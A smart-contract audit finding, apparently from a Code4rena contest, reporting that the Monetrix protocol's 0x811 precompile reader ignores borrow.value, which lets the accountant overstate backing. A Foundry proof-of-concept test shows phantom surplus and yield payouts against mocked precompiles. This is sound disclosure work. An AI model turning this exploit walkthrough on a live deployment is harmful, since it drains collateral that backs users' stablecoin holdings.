`PrecompileReader.suppliedBalance` ignores `borrow.value` on 0x811, letting `Accountant.totalBackingSigned` over-count backing
Avatar for ABAIKUNANBAEV
ABAIKUNANBAEV

Medium

82d ago

The precompile at 0x0000000000000000000000000000000000000811 is BORROW_LEND_USER_STATE, not a plain "supplied balance" reader. Per Hyperliquid's L1Read.sol (mirrored in emo-eth/hyperevm-tools) and the Hyperliquid TS SDK BorrowLendUserStateResponse, it returns a BorrowLendUserTokenState:

struct BasisAndValue { uint64 basis; uint64 value; }
struct BorrowLendUserTokenState {
    BasisAndValue borrow;   // ABI slots 1,2
    BasisAndValue supply;   // ABI slots 3,4
}
ABI-encoded as (uint64 borrow.basis, uint64 borrow.value, uint64 supply.basis, uint64 supply.value) — 128 bytes.

PrecompileReader.suppliedBalance picks slot 4 (= supply.value) correctly, but never reads slot 2 (= borrow.value):

(,,, supplied) = abi.decode(res, (uint64, uint64, uint64, uint64));
Both consumers — suppliedUsdcEvm and suppliedNotionalUsdcFromPerp — treat the returned value as pure backing. MonetrixAccountant._readL1Backing then does:

total += int256(PrecompileReader.suppliedUsdcEvm(account));
total += int256(PrecompileReader.suppliedNotionalUsdcFromPerp(uint32(a.spotToken), a.perpIndex, account));
So for any account that has taken a PM borrow, totalBackingSigned() is overstated by exactly borrow.value (denominated in USDC for USDC borrows; in USDC-notional via perp oracle price for asset borrows).

Replace suppliedBalance with a full state reader and have every consumer work on a signed net.

Proof of Concept
Insert into C4Submission.t.sol:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// In-scope tokens
import {USDM} from "../../src/tokens/USDM.sol";
import {sUSDM} from "../../src/tokens/sUSDM.sol";
import {sUSDMEscrow} from "../../src/tokens/sUSDMEscrow.sol";

// In-scope core
import {MonetrixVault} from "../../src/core/MonetrixVault.sol";
import {MonetrixAccountant} from "../../src/core/MonetrixAccountant.sol";
import {MonetrixConfig} from "../../src/core/MonetrixConfig.sol";
import {RedeemEscrow} from "../../src/core/RedeemEscrow.sol";
import {YieldEscrow} from "../../src/core/YieldEscrow.sol";
import {InsuranceFund} from "../../src/core/InsuranceFund.sol";

// In-scope governance
import {MonetrixAccessController} from "../../src/governance/MonetrixAccessController.sol";

// In-scope constants
import {HyperCoreConstants} from "../../src/interfaces/HyperCoreConstants.sol";

// PoC-only: read the buggy 0x811 path directly to demonstrate the root cause.
import {PrecompileReader} from "../../src/core/PrecompileReader.sol";

// Shared test mocks
import {MockUSDC} from "../mocks/MockUSDC.sol";
import {MockCoreDepositWallet} from "../mocks/MockCoreDepositWallet.sol";

/// @dev No-op CoreWriter. Any `sendRawAction` call is accepted silently so PoCs
///      exercising Operator paths (hedge/bridge/HLP/BLP) don't revert at the
///      HyperCore boundary.
contract _PoCMockCoreWriter {
    event ActionSent(bytes action);

    function sendRawAction(bytes calldata action) external {
        emit ActionSent(action);
    }
}

/// @dev Controllable mock for every HyperCore read-precompile (0x0800..0x0811).
///      Defaults to 128 zero bytes so Accountant's fail-closed decoders treat
///      unmocked slots as "no position / zero balance". Override per-slot from
///      your PoC via `setResponse(key, value)`.
contract _PoCMockPrecompile {
    mapping(bytes32 => bytes) public responses;

    function setResponse(bytes calldata callData, bytes calldata response) external {
        responses[keccak256(callData)] = response;
    }

    fallback(bytes calldata data) external payable returns (bytes memory) {
        bytes memory r = responses[keccak256(data)];
        if (r.length == 0) return new bytes(128);
        return r;
    }
}

/// @title  C4Submission — PoC template for Code4rena wardens
/// @notice Every High/Medium submission must be demonstrated inside
///         `test_submissionValidity`. `setUp()` deploys the full Monetrix
///         protocol (all in-scope contracts behind ERC-1967 UUPS proxies),
///         wires roles, mocks HyperCore precompiles + CoreWriter, and funds
///         two test users with 1M USDC each.
///
///         How to submit:
///           1. **Do not copy this file.** Edit it in place.
///           2. Write your exploit inside the body of `test_submissionValidity`.
///              Use the provided helpers (`_deposit`, `_stake`, `_requestRedeem`,
///              `_mockVaultL1SpotUsdc`, `_mockVaultL1SuppliedUsdc`).
///           3. Leave `setUp()` alone unless your finding genuinely requires
///              different initial state. If you must change it, restrict the
///              edits to the minimum needed and document why in a comment.
///           4. Run `forge test --match-path "test/c4/C4Submission.t.sol" -vvv`
///              and confirm `test_submissionValidity` passes (i.e. your PoC
///              terminates in the expected faulty state).
contract C4Submission is Test {
    // ─── In-scope contracts ─────────────────────────────────────
    MonetrixAccessController public acl;
    USDM public usdm;
    sUSDM public susdm;
    sUSDMEscrow public unstakeEscrow;
    InsuranceFund public insurance;
    MonetrixConfig public config;
    MonetrixVault public vault;
    MonetrixAccountant public accountant;
    RedeemEscrow public redeemEscrow;
    YieldEscrow public yieldEscrow;

    // ─── Test doubles ───────────────────────────────────────────
    MockUSDC public usdc;
    MockCoreDepositWallet public depositWallet;

    // ─── Actors ─────────────────────────────────────────────────
    /// @dev `admin` is DEFAULT_ADMIN + GOVERNOR + GUARDIAN + UPGRADER so every
    ///      privileged setter can be reached via `vm.prank(admin)`.
    address public admin = address(0xAD);
    address public operator = address(0xBB);
    address public foundation = address(0xF0);
    address public user1 = address(0x1);
    address public user2 = address(0x2);

    function setUp() public virtual {
        // ── Mocks (USDC + CoreDepositWallet) ──────────────────
        usdc = new MockUSDC();
        depositWallet = new MockCoreDepositWallet(address(usdc));

        vm.startPrank(admin);

        // ── ACL (bootstrap: admin is the sole DEFAULT_ADMIN) ──
        acl = MonetrixAccessController(
            address(
                new ERC1967Proxy(
                    address(new MonetrixAccessController()),
                    abi.encodeCall(MonetrixAccessController.initialize, (admin))
                )
            )
        );

        // ── USDM ──────────────────────────────────────────────
        usdm = USDM(
            address(new ERC1967Proxy(address(new USDM()), abi.encodeCall(USDM.initialize, (address(acl)))))
        );

        // ── InsuranceFund (USDC-denominated, holds reserves) ──
        insurance = InsuranceFund(
            address(
                new ERC1967Proxy(
                    address(new InsuranceFund()),
                    abi.encodeCall(InsuranceFund.initialize, (address(usdc), address(acl)))
                )
            )
        );

        // ── Config (parameters + insurance/foundation routing) ──
        config = MonetrixConfig(
            address(
                new ERC1967Proxy(
                    address(new MonetrixConfig()),
                    abi.encodeCall(MonetrixConfig.initialize, (address(insurance), foundation, address(acl)))
                )
            )
        );

        // ── sUSDM (ERC-4626 staking wrapper over USDM) ────────
        susdm = sUSDM(
            address(
                new ERC1967Proxy(
                    address(new sUSDM()),
                    abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
                )
            )
        );

        // ── Vault (user deposit/redeem entrypoint) ────────────
        vault = MonetrixVault(
            address(
                new ERC1967Proxy(
                    address(new MonetrixVault()),
                    abi.encodeCall(
                        MonetrixVault.initialize,
                        (
                            address(usdc),
                            address(usdm),
                            address(susdm),
                            address(config),
                            address(depositWallet),
                            address(acl)
                        )
                    )
                )
            )
        );

        // ── Accountant (backing / settle / yield gates) ───────
        accountant = MonetrixAccountant(
            address(
                new ERC1967Proxy(
                    address(new MonetrixAccountant()),
                    abi.encodeCall(
                        MonetrixAccountant.initialize,
                        (address(vault), address(usdc), address(usdm), address(acl))
                    )
                )
            )
        );

        // ── RedeemEscrow (custody of pending redemption USDC) ─
        redeemEscrow = RedeemEscrow(
            address(
                new ERC1967Proxy(
                    address(new RedeemEscrow()),
                    abi.encodeCall(RedeemEscrow.initialize, (address(usdc), address(vault), address(acl)))
                )
            )
        );

        // ── YieldEscrow (custody of declared yield USDC) ──────
        yieldEscrow = YieldEscrow(
            address(
                new ERC1967Proxy(
                    address(new YieldEscrow()),
                    abi.encodeCall(YieldEscrow.initialize, (address(usdc), address(vault), address(acl)))
                )
            )
        );

        // ── Roles. admin plays Governor/Guardian/Upgrader; operator is distinct. ──
        acl.grantRole(acl.GOVERNOR(), admin);
        acl.grantRole(acl.GUARDIAN(), admin);
        acl.grantRole(acl.OPERATOR(), admin);
        acl.grantRole(acl.OPERATOR(), operator);
        acl.grantRole(acl.UPGRADER(), admin);

        // ── Bind USDM/sUSDM mint/burn authority to the vault ──
        usdm.setVault(address(vault));
        susdm.setVault(address(vault));

        // ── sUSDMEscrow (non-upgradeable custody for the unstake queue) ──
        unstakeEscrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(unstakeEscrow));

        // ── Wire vault → escrows + accountant, accountant → config ──
        vault.setAccountant(address(accountant));
        vault.setRedeemEscrow(address(redeemEscrow));
        vault.setYieldEscrow(address(yieldEscrow));
        accountant.setConfig(address(config));

        // ── Open Gate 1 of the settle pipeline ────────────────
        accountant.initializeSettlement();

        vm.stopPrank();

        // ── Etch HyperCore precompiles (read paths) ──────────
        //    Every slot the Accountant reads through PrecompileReader is backed
        //    by a fresh _PoCMockPrecompile. Default response is 128 zero bytes.
        //    Override from your PoC via `_MOCK_PRECOMPILE(...).setResponse(...)`.
        vm.etch(HyperCoreConstants.PRECOMPILE_ACCOUNT_MARGIN_SUMMARY, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_ORACLE_PX, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_VAULT_EQUITY, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_PERP_ASSET_INFO, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_TOKEN_INFO, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_POSITION, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_SPOT_PX, address(new _PoCMockPrecompile()).code);

        // ── Etch CoreWriter (write path) ──────────────────────
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new _PoCMockCoreWriter()).code);

        // ── Fund users with 1M USDC each ─────────────────────
        usdc.mint(user1, 1_000_000e6);
        usdc.mint(user2, 1_000_000e6);
    }

    // ═══════════════════════════════════════════════════════════
    //  Helpers — use inside your PoC to reduce boilerplate.
    // ═══════════════════════════════════════════════════════════

    /// @dev USDC → USDM (1:1 mint via vault.deposit).
    function _deposit(address user, uint256 usdcAmount) internal {
        vm.startPrank(user);
        usdc.approve(address(vault), usdcAmount);
        vault.deposit(usdcAmount);
        vm.stopPrank();
    }

    /// @dev USDM → sUSDM (ERC-4626 stake).
    function _stake(address user, uint256 usdmAmount) internal {
        vm.startPrank(user);
        usdm.approve(address(susdm), usdmAmount);
        susdm.deposit(usdmAmount, user);
        vm.stopPrank();
    }

    /// @dev Queue a redemption request. Returns the request id for later claim.
    function _requestRedeem(address user, uint256 usdmAmount) internal returns (uint256 requestId) {
        vm.startPrank(user);
        usdm.approve(address(vault), usdmAmount);
        requestId = vault.requestRedeem(usdmAmount);
        vm.stopPrank();
    }

    /// @dev Seed the vault's L1 spot USDC balance on the mock 0x801 precompile.
    ///      `l1Amount8dp` is in 8-decimal HL wei (USDC on L1 is 8-dp internally).
    function _mockVaultL1SpotUsdc(uint64 l1Amount8dp) internal {
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(l1Amount8dp, uint64(0), uint64(0))
        );
    }

    /// @dev Seed the vault's L1 supplied (Portfolio Margin) USDC balance on 0x811.
    ///      Layout: `(uint64, uint64, uint64, uint64 supplied)` — reader takes
    ///      the 4th slot.
    function _mockVaultL1SuppliedUsdc(uint64 l1Amount8dp) internal {
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0), l1Amount8dp)
        );
    }

    // ═══════════════════════════════════════════════════════════
    //  YOUR POC GOES HERE.
    //
    //  Do not rename `test_submissionValidity`, do not create a new
    //  test file, and do not modify anything outside this function
    //  body unless `setUp()` genuinely cannot produce the precondition
    //  you need. The judge runs this exact test name to verify your
    //  submission.
    //
    //  The body below is a placeholder that only exercises the default
    //  scaffolding so the test passes out of the box. Replace it with
    //  the steps that trigger your finding; the test should still pass
    //  at the end, with assertions proving the bug.
    // ═══════════════════════════════════════════════════════════

    function test_submissionValidity() public {
        // ══════════════════════════════════════════════════════════════════
        // FINDING: Accountant silently ignores PM `borrow.value` when
        //          reading the 0x811 BORROW_LEND_USER_STATE precompile.
        //
        // ROOT CAUSE: src/core/PrecompileReader.sol:126–136
        //
        //   function suppliedBalance(address account, uint64 token)
        //       internal view returns (uint64 supplied)
        //   {
        //       (bool ok, bytes memory res) = HyperCoreConstants
        //           .PRECOMPILE_SUPPLIED_BALANCE                       // = 0x811
        //           .staticcall(abi.encode(account, token));
        //       require(ok && res.length >= 128, "...");
        //       (,,, supplied) = abi.decode(res, (uint64,uint64,uint64,uint64));
        //   }
        //
        // WHAT 0x811 ACTUALLY RETURNS (authoritative L1Read.sol):
        //
        //   struct BasisAndValue        { uint64 basis; uint64 value; }
        //   struct BorrowLendUserTokenState {
        //       BasisAndValue borrow;   // slots 1,2
        //       BasisAndValue supply;   // slots 3,4
        //   }
        //
        //   Per emo-eth/hyperevm-tools/src/L1Read.sol (mirrors the file
        //   attached to Hyperliquid's "Interacting with HyperCore" docs):
        //       address constant BORROW_LEND_USER_STATE_PRECOMPILE_ADDRESS
        //           = 0x0000000000000000000000000000000000000811;
        //   and the TypeScript SDK (`@nktkas/hyperliquid`) exposes the same
        //   shape via `BorrowLendUserStateResponse.tokenToState[].{borrow,supply}
        //   .{basis,value}`.
        //
        // The reader picks slot 4 (= supply.value) correctly but NEVER reads
        // slot 2 (= borrow.value). Both call sites of suppliedBalance in
        // MonetrixAccountant._readL1Backing treat the supplied value as pure
        // backing:
        //
        //   total += int256(PrecompileReader.suppliedUsdcEvm(account));
        //   total += int256(PrecompileReader.suppliedNotionalUsdcFromPerp(...));
        //
        // ⇒ totalBackingSigned() can be overstated by the FULL outstanding
        //   borrow. That bypasses Gate 3 (`proposedYield ≤ distributable`)
        //   in settleDailyPnL and lets the operator chain-settle "yield"
        //   that is really unpaid PM debt — every settle bleeds real USDC
        //   out of the backing pool to InsuranceFund + foundation, plus
        //   mints unbacked USDM into sUSDM for stakers.
        //
        // NOTE on the setUp helper `_mockVaultL1SuppliedUsdc`: it only lets
        //   you seed supply.value. To demonstrate the bug we have to seed
        //   ALL four slots (including a non-zero borrow.value), so the
        //   exploit writes the precompile response directly via
        //   `_PoCMockPrecompile.setResponse`. We do NOT modify setUp.
        // ══════════════════════════════════════════════════════════════════

        // ─── Step 1. Real user deposits 1M USDC, mints 1M USDM. ─────────
        _deposit(user1, 1_000_000e6);
        assertEq(usdm.totalSupply(), 1_000_000e6, "USDM minted 1:1 with USDC");
        assertEq(usdc.balanceOf(address(vault)), 1_000_000e6, "Vault holds USDC");

        // ─── Step 2. Operator bridges the full 1M to L1; flip PM on. ───
        // bridgeInterval defaults to 6 hours; warp past it.
        vm.warp(block.timestamp + 6 hours + 1);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);
        assertEq(vault.outstandingL1Principal(), 1_000_000e6);
        assertEq(usdc.balanceOf(address(vault)), 0, "USDC left the EVM side");

        vm.prank(admin);
        vault.setPmEnabled(true);

        // ─── Step 3. Register USDC (token_index 0) in vaultSupplied so    ─
        //             Accountant iterates the 0x811 slot. In production this
        //             happens automatically via `supplyToBlp(0, ...)` or via
        //             the notifyVaultSupply hook; here we take the same
        //             path by impersonating the Vault.                     ─
        vm.prank(address(vault));
        accountant.notifyVaultSupply(uint64(HyperCoreConstants.USDC_TOKEN_INDEX), 0);

        // ─── Step 4. Seed 0x811 with a realistic PM state:               ─
        //              supply.value = 1,900,000 USDC (L1 8-dp wei)
        //              borrow.value =   900,000 USDC (L1 8-dp wei)
        //            Real net PM USDC = 1,000,000 = USDM supply → real
        //            surplus is ZERO. But the reader will report the
        //            full 1,900,000 as backing.                           ─
        uint64 supplyValueL1 = uint64(1_900_000e8);
        uint64 borrowValueL1 = uint64(  900_000e8);
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            // (borrow.basis, borrow.value, supply.basis, supply.value)
            abi.encode(uint64(0), borrowValueL1, uint64(0), supplyValueL1)
        );

        // ─── Step 4a. Direct library assertion — the reader swallows     ─
        //              borrow.value and returns gross supply.value.        ─
        uint256 readerSees = PrecompileReader.suppliedUsdcEvm(address(vault));
        uint256 realNetPm  = uint256(supplyValueL1 - borrowValueL1) / 100; // 8-dp → 6-dp
        assertEq(readerSees, 1_900_000e6, "reader returns gross supply.value");
        assertEq(realNetPm,  1_000_000e6, "sanity: real net PM contribution is 1M");
        assertEq(readerSees - realNetPm, 900_000e6, "hidden liability = 900k USDC");

        // ─── Step 5. Accountant state: phantom surplus = exactly the      ─
        //             unreported borrow liability.                         ─
        int256 backing  = accountant.totalBackingSigned();
        int256 surplus  = accountant.surplus();
        int256 distrib  = accountant.distributableSurplus();
        emit log_named_int("totalBackingSigned (bug)",     backing);   // 1,900,000e6
        emit log_named_int("surplus            (phantom)", surplus);   //   900,000e6
        emit log_named_int("distributable      (phantom)", distrib);   //   900,000e6
        assertEq(backing, int256(1_900_000e6), "gross supply counted as backing");
        assertEq(surplus, int256(  900_000e6), "phantom +900k surplus == hidden borrow");
        assertEq(distrib, int256(  900_000e6), "Gate 3 bypassed: distributable == phantom");

        // ─── Step 6. Drive a settle + distributeYield to show real harm. ─
        // setUp already called accountant.initializeSettlement(), so Gate 1
        // is open. Warp past the 20h minSettlementInterval.
        vm.warp(block.timestamp + 21 hours);

        // Fund the vault with spare EVM USDC so vault.settle's local
        // sufficiency check passes. This represents yield that was
        // bridged back in earlier cycles. Separate from the attack.
        usdc.mint(address(vault), 50_000e6);

        // Need at least one sUSDM staker so distributeYield's user-share
        // branch doesn't re-route to foundation (see MonetrixVault.sol L560).
        _deposit(user2, 1_000e6);
        _stake(user2, 1_000e6);

        // Gate 4 (annualized cap) is the only surviving bound on proposedYield.
        // At 12% APR on 1M USDM over ~21h, cap ≈ 287.67 USDC per settle cycle.
        uint256 elapsed = 21 hours;
        uint256 cap =
            (usdm.totalSupply() * config.maxAnnualYieldBps() * elapsed) / (10_000 * 365 days);
        emit log_named_uint("APR cap (binding gate now)", cap);
        assertGt(cap, 0);
        assertLt(uint256(distrib), type(uint256).max);
        assertGt(uint256(distrib), cap, "distributable is far looser than cap - attacker-friendly");

        // Snapshot the three sinks before the drain.
        uint256 insBefore   = usdc.balanceOf(address(insurance));
        uint256 fndBefore   = usdc.balanceOf(foundation);
        uint256 susdmBefore = usdm.balanceOf(address(susdm));
        uint256 supplyBefore = usdm.totalSupply();

        vm.prank(operator);
        vault.settle(cap);

        vm.prank(operator);
        vault.distributeYield();

        uint256 userShare  = (cap * config.userYieldBps()) / 10_000;
        uint256 insShare   = (cap * config.insuranceYieldBps()) / 10_000;
        uint256 fndShare   = cap - userShare - insShare;

        // ─── Step 7. Each sink received its cut of phantom yield. ───────
        assertEq(
            usdc.balanceOf(address(insurance)) - insBefore, insShare,
            "InsuranceFund drained - real USDC out of backing pool"
        );
        assertEq(
            usdc.balanceOf(foundation) - fndBefore, fndShare,
            "Foundation drained - real USDC out of backing pool"
        );
        assertEq(
            usdm.balanceOf(address(susdm)) - susdmBefore, userShare,
            "sUSDM received freshly-minted USDM with no matching new collateral"
        );
        assertEq(
            usdm.totalSupply() - supplyBefore, userShare,
            "USDM supply inflated by `userShare` on top of the attacker's fake yield"
        );

        emit log_named_uint("[DRAIN] foundation share",  fndShare);
        emit log_named_uint("[DRAIN] insurance  share",   insShare);
        emit log_named_uint("[MINT ] fresh USDM to sUSDM", userShare);

        // The protocol's real backing is now strictly WORSE than it was
        // before this call (insurance + foundation left the pool, USDM
        // supply went up), yet the on-chain state reports `surplus > 0`
        // and the cycle will repeat on every 20h tick for as long as
        // the 0x811 account carries borrow.value > 0.
    }
}
Output:

[PASS] test_submissionValidity() (gas: 1052974)
Logs:
  totalBackingSigned (bug):     1,900,000.000000
  surplus (phantom):              900,000.000000
  distributable (phantom):        900,000.000000
  APR cap (binding gate now):         287.958904
  [DRAIN] foundation share:            57.591782
  [DRAIN] insurance share:             28.795890
  [MINT ] fresh USDM to sUSDM:        201.571232
Links to affected code
PrecompileReader.sol#L126-L136Opens in a new window
PrecompileReader.sol#L218-L234Opens in a new window
PrecompileReader.sol#L242-L280Opens in a new window
Submissions touching same files
PrecompileReader.sol
